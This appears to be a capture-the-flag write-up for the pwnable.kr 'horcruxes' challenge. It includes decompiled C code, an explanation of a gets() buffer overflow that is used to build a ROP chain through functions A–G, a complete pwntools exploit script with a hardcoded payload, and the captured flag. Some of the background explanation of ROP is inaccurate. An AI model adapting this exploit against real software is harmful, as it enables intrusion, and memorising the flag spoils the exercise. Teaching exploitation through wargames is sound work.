# input

## Description

horcruxes - 7 pt

> Voldemort concealed his splitted soul inside 7 horcruxes. <br>
> Find all horcruxes, and ROP it! <br>
> author: jiwon choi <br> <br>
> ssh horcruxes@pwnable.kr -p2222 (pw:guest)

## Solution

### Background

#### ROP

ROP stands for Return Oriented Programming. It is a technique that allows us to execute code without using the stack, based on the fact that the return address of a function is stored in the stack.

Basically, ROPing is done by overwriting the return address of a function, with some other address that we want to jump to. 

It is important to note that modern calling conventions require that the stack is aligned to 16 bytes. However, when we jump from one function, say `f`, to another - `g`, using ROP, we don't push a return address to the stack. And so, when entering `g`, after pushing the old base pointer - the stack will not be aligned to 16 bytes.

We can solve this problem by overwriting 8 more bytes after the return address. We will overwrite the **return address** with the address of *another* (or the same) return instruction, and overwrite the **next 8/4 bytes** with the address of the function we want to jump to.

The program will jump to a return instruction, and from there to the function we want to jump to. Thus, 2 pop instruction will be executed, and the stack will be aligned to 16 bytes. 


### Exploit

In this challenge we are given a binary, and a readme file that explains where to connect to. The binary is a 32 bit ELF file, and we can see that it has no canary.

Here are the (relevant) results of decompiling the binary:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ...

  init_ABCDEFG();
  
  ...
  
  return ropme();
}
```

```c
int init_ABCDEFG()
{
  ...
  a = -559038737 * rand() % 0xCAFEBABE;
  b = -559038737 * rand() % 0xCAFEBABE;
  c = -559038737 * rand() % 0xCAFEBABE;
  d = -559038737 * rand() % 0xCAFEBABE;
  e = -559038737 * rand() % 0xCAFEBABE;
  f = -559038737 * rand() % 0xCAFEBABE;
  g = -559038737 * rand() % 0xCAFEBABE;
  result = f + e + d + c + b + a + g;
  sum = result;
  return result;
}
```

```c
int ropme()
{
  int v1; // [esp-Ch] [ebp-84h]
  int v2; // [esp-8h] [ebp-80h]
  int v3; // [esp-4h] [ebp-7Ch]
  char v4[100]; // [esp+4h] [ebp-74h] BYREF
  int v5; // [esp+68h] [ebp-10h] BYREF
  int v6; // [esp+6Ch] [ebp-Ch]

  printf("Select Menu:");
  __isoc99_scanf("%d", &v5);
  getchar();
  if ( v5 == a )
  {
    A();
  }
  else if ( v5 == b )
  {
    B();
  }

  ...

  else if ( v5 == g )
  {
    G();
  }
  else
  {
    printf("How many EXP did you earned? : ");
    gets(v4);
    if ( atoi(v4) == sum )
    {
      v6 = open("flag", 0);
      v4[read(v6, v4, 100)] = 0;
      puts(v4);
      close(v6);
      exit(0, v1, v2, v3);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
  return 0;
}
```

The porgram starts by calling `init_ABCDEFG`, which initializes the variables `a`, ..., `g` with random values. Then, it calls `ropme`. There, we are asked to choose a number. If it is equal to one of the variables, we will jump to the function `A`, ..., `G` respectively. Otherwise, we will be asked to enter another number. If it is equal to the sum of the variables, we will get the flag.

The functions `A`, ..., `G` are all the very similar. They all print a message, and the value of `a`, ..., `g` respectively.

At a first glance, it seems that the ROP is very simple - we overflow on `gets(v4)` and overwrite the return address jumping to the `v6 = open("flag", 0);` line. However, there is a problem - in the `ropme` function, all of the addresses are of the format `0x80a0XXX`. Since `0a` is also the ascii code of `\n`, we can't use it in our payload.

And so, the solution is to jump to each and every one of the functions `A`, ..., `G`, sum the values of `a`, ..., `g`, and then jump to the call to `ropme` from the `main` function (since we can't jump anywhere inside `ropme`). Then, we will insert the sum and get the flag.

As we mentioned before, we need to consider stack alignment. Everytime we want to jump anywhere, we must first jump to a return instruction, and then to the address we want to jump to.
Here is the exploit:

```python
from pwn import *
import numpy as np
import re

con = remote('pwnable.kr', 9032)

con.sendline(b'1\n' + b'\x41'*100 + b'\x42'*4*5 + b'\x69\xfe\x09\x08' + 
            b'\x4b\xfe\x09\x08' + b'\x69\xfe\x09\x08' + b'\x6a\xfe\x09\x08' +
            b'\x69\xfe\x09\x08' + b'\x89\xfe\x09\x08' + b'\x69\xfe\x09\x08' +
            b'\xa8\xfe\x09\x08' + b'\x69\xfe\x09\x08' + b'\xc7\xfe\x09\x08' +
            b'\x69\xfe\x09\x08' + b'\xe6\xfe\x09\x08' + b'\x69\xfe\x09\x08' +
            b'\x05\xff\x09\x08' + b'\x69\xfe\x09\x08' + b'\xfc\xff\x09\x08')

con.recvuntil(b'Select Menu:')

horcruxes = con.recvuntil(b'Select Menu:')
soul_parts = re.findall(b'EXP \+([0-9-]*)', horcruxes)
soul = np.int32(np.sum([np.int32(_.decode()) for _ in soul_parts]))

con.sendline(b'1')
con.sendline(str(soul).encode() + b'\x00')

con.interactive()
```

```
Magic_spell_1s_4vad4_K3daVr4!
